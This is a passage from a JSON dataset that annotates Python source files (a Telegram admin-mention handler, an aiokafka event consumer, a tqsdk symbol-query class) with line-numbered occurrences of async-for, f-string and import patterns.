chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup`\"\n    chat = await event.get_input_chat()\n    async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n        mentions += f\"\"\n    reply_message = None\n    if event.reply_to_msg_id:\n        reply_message = await event.get_reply_message()\n        await reply_message.reply(mentions)\n    else:\n        await event.reply(mentions)\n    await event.delete()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        11,
                        12,
                        "async for",
                        "async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n        mentions += f\"\""
                    ]
                ],
                "pep_498": [
                    [
                        12,
                        "        mentions += f\"\""
                    ]
                ]
            }
        },
        "178": {
            "file": "import asyncio\nimport json\nimport logging\nfrom logging.config import dictConfig\nimport aiokafka\nimport click\nimport yaml\nimport memconsumer\nfrom utils import get_logger, set_log_id, start_eldm\nwith open(\"logging.yaml\") as f:\n    dictConfig(yaml.load(f, Loader=yaml.SafeLoader))\nlog = get_logger(\"counter\")\nlog_timings = get_logger(\"timings\")\nlock_log = get_logger(\"locklog\")\nasync def main(group_id_id):\n    asyncio.create_task(start_eldm())\n    consumer = memconsumer.AIOKafkaMemConsumer(\n        group_id=\"events_cons\",\n        mem_unique_id=group_id_id,\n        auto_offset_reset=\"earliest\",\n        topic=\"events\",\n    )\n    await consumer.start()\n    producer = aiokafka.AIOKafkaProducer()\n    await producer.start()\n    mem = consumer.get_mem()\n    async def handle_msg(msg):\n        log.info(f\"  Handling msg: {msg.offset}-->{msg.key}:{msg.value}.\")\n        val = mem[msg.key.decode()]\n        new_val = int(msg.value.decode())\n        if (\n            not new_val in val\n        ):  \n            val.append(new_val)\n        setitem_info = await mem.setitem(\n            msg.key.decode(), val\n        )  \n        await producer.send(\"event-lists\", value=json.dumps(val).encode(), key=msg.key)\n        log.info(f\"  Done handling msg: {msg.value}\")\n    try:\n        async for msg in consumer.items():\n            await handle_msg(msg)\n            await consumer.commit()  \n    finally:\n        print(\"stopping consumer/producer\")\n        await consumer.stop()\n        await producer.stop()\n        print(\"done\")\n@click.command()\n@click.option(\"--group-id-id\", required=True, type=int)\ndef cli(group_id_id):\n    set_log_id(group_id_id)\n    loop = asyncio.get_event_loop()\n    loop.set_debug(enabled=True)\n    logging.getLogger(\"asyncio\").setLevel(logging.DEBUG)\n    loop.slow_callback_duration = 1\n    asyncio.run(main(group_id_id))\nif __name__ == \"__main__\":\n    cli()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        41,
                        43,
                        "async for",
                        "async for msg in consumer.items():\n            await handle_msg(msg)\n            await consumer.commit()"
                    ]
                ],
                "pep_498": [
                    [
                        28,
                        "        log.info(f\"  Handling msg: {msg.offset}-->{msg.key}:{msg.value}.\")"
                    ],
                    [
                        39,
                        "        log.info(f\"  Done handling msg: {msg.value}\")"
                    ]
                ]
            }
        },
        "179": {
            "file": "__author__ = 'mayanqiong'\nimport asyncio\nfrom tqsdk.objs import Quote\nclass TqSymbols(object):\n    async def _run(self, api, sim_send_chan, sim_recv_chan, md_send_chan, md_recv_chan):\n        self._api = api\n        self._sim_send_chan = sim_send_chan\n        self._sim_recv_chan = sim_recv_chan\n        self._md_send_chan = md_send_chan\n        self._md_recv_chan = md_recv_chan\n        self._quotes_all_keys = set(Quote(None).keys())\n        self._quotes_all_keys = self._quotes_all_keys.union({'margin', 'commission'})\n        sim_task = self._api.create_task(self._sim_handler())\n        try:\n            async for pack in self._md_recv_chan:\n                if pack.get(\"aid\") == \"rtn_data\":\n                    data = pack.setdefault(\"data\", [])\n                    for d in data:\n                        for query_id, query_result in d.get(\"symbols\", {}).items():\n                            if query_result:\n                                if query_result.get(\"error\", None):\n                                    raise Exception(f\"\u67e5\u8be2\u5408\u7ea6\u670d\u52a1\u62a5\u9519 {query_result['error']}\")\n                                elif query_id.startswith(\"PYSDK_quote\"):\n                                    data.append(\n                                        {\"quotes\": self._api._symbols_to_quotes(query_result, self._quotes_all_keys)}\n                                    )\n                                    self._md_send_chan.send_nowait({\n                                        \"aid\": \"ins_query\",\n                                        \"query_id\": query_id,\n                                        \"query\": \"\",\n                                        \"variables\": {}\n                                    })\n                await self._sim_recv_chan.send(pack)\n        finally:\n            sim_task.cancel()\n            await asyncio.gather(sim_task, return_exceptions=True)\n    async def _sim_handler(self):\n        async for pack in self._sim_send_chan:\n            await self._md_send_chan.send(pack)",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        38,
                        39,
                        "async for",
                        "async for pack in self._sim_send_chan:\n            await self._md_send_chan.send(pack)"
                    ],
                    [
                        15,
                        33,
                        "async for",
                        "async for pack in self._md_recv_chan:\n                if pack.get(\"aid\") == \"rtn_data\":\n                    data = pack.setdefault(\"data\", [])\n                    for d in data:\n                        for query_id, query_result in d.get(\"symbols\", {}).items():\n                            if query_result:\n                                if query_result.get(\"error\", None):\n                                    raise Exception(f\"\u67e5\u8be2\u5408\u7ea6\u670d\u52a1\u62a5\u9519 {query_result['error']}\")\n                                elif query_id.startswith(\"PYSDK_quote\"):\n                                    data.append(\n                                        {\"quotes\": self._api._symbols_to_quotes(query_result, self._quotes_all_keys)}\n                                    )\n                                    self._md_send_chan.send_nowait({\n                                        \"aid\": \"ins_query\",\n                                        \"query_id\": query_id,\n                                        \"query\": \"\",\n                                        \"variables\": {}\n                                    })\n                await self._sim_recv_chan.send(pack)"
                    ]
                ],
                "pep_498": [
                    [
                        22,
                        "                                    raise Exception(f\"\u67e5\u8be2\u5408\u7ea6\u670d\u52a1\u62a5\u9519 {query_result['error']}\")"
                    ]
                ]
            }
        }
    }
}